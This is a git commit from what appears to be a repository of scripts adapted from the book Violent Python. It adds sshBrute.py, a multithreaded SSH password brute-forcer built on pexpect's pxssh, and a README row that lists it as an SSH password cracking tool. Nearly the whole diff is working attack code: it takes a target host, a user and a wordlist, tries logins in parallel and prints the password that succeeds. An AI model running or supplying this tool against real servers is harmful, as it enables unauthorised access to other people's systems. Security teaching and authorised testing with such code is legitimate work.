23c7d4927f86eaedab225f6b6258c14088202149
Atiger77 <atiger77@126.com>
2017-01-31 22:51:28 +0800

    #Add sshBurte

---
+++ ChapterTwo/sshBrute.py
@@ -0,0 +1,74 @@
+#coding: utf-8
+'''
+Author:
+       __  _             ________
+ ___ _/ /_(_)__ ____ ___/_  /_  /
+/ _ `/ __/ / _ `/ -_) __// / / /
+\_,_/\__/_/\_, /\__/_/  /_/ /_/
+          /___/
+Date:20170129
+Desc:使用pxssh模块暴力破解SSH服务登录密码
+
+'''
+
+from pexpect import pxssh
+import optparse,time,threading
+
+maxConnections = 5
+connection_lock = threading.BoundedSemaphore(value=maxConnections)
+Found = False
+Fails = 0
+
+def connect(host,user,password,release):
+    global Found
+    global Fails
+    try:
+        s = pxssh.pxssh()
+	s.login(host,user,password)
+        print '[+] Password Found: ' + password
+        Found = True
+    except Exception,e:
+	if 'read_nonblocking' in str(e):
+            Fails += 1
+            time.sleep(5)
+            connect(host,user,password,False)
+        elif 'synchronize with original prompt' in str(e):
+            time.sleep(1)
+            connect(host,user,password,False)
+    finally:
+        if release: connection_lock.release()        
+
+
+def main():
+    parser = optparse.OptionParser("usage  -H <target ipaddr> -U <user> -F <password list>")
+    parser.add_option('-H',dest='tgtHost',type='string',help='specify target ipaddr')
+
+    parser.add_option('-U',dest='user',type='string',help='specify target user')
+    parser.add_option('-F',dest='passwdFile',type='string',help='specify passwd file')
+    (options,args) = parser.parse_args()
+    host  = options.tgtHost
+    user  = options.user
+    passwdfile  = options.passwdFile
+    
+    if host == None  or user == None or passwdfile == None:
+        print parser.usage
+        exit(0)
+    
+    fn = open(passwdfile,'r')
+    lines = fn.readlines()
+    for line in lines:
+        if Found:
+            print "[*] Exiting: Password Found"
+            exit(0)
+        if Fails > 5:
+            print "[!] Exiting: Too many socket timeouts"
+            exit(0)
+        connection_lock.acquire()
+        password = line.strip('\r').strip('\n')
+        t = threading.Thread(target=connect,args=(host,user,password,True)) 
+        t.start()  
+
+
+if __name__ == '__main__':
+    #connect('172.16.56.132','root','123456','True')
+    main()
--- README.md
+++ README.md
@@ -2,11 +2,11 @@
 >根据ViolentPython书中的代码进行扩展修改后上传
 
 
-
 | 章节     | 脚本名称      | 脚本功能概述                                  |
 | -------- |:-------------:| ---------------------------------------------:|
 | Chap 1   | PortScan      | 单线程扫描指定IP，常用端口开放情况            |
 | Chap 1   | ZipCrack      | 多线程破解ZIP密码文件，增加冗错机制           |
 | Chap 2   | TcpFullScan   | TCP全连接端口扫描器，扫描指定IP下指定端口     |
-| Chap 2   | NMAPPortScann | NMAP扫描器，扫描指定IP下指定端口     |
+| Chap 2   | NMAPPortScann | NMAP扫描器，扫描指定IP下指定端口              |
+| Chap 2   | sshBrute      | 爆破ssh密码程序                               |
 
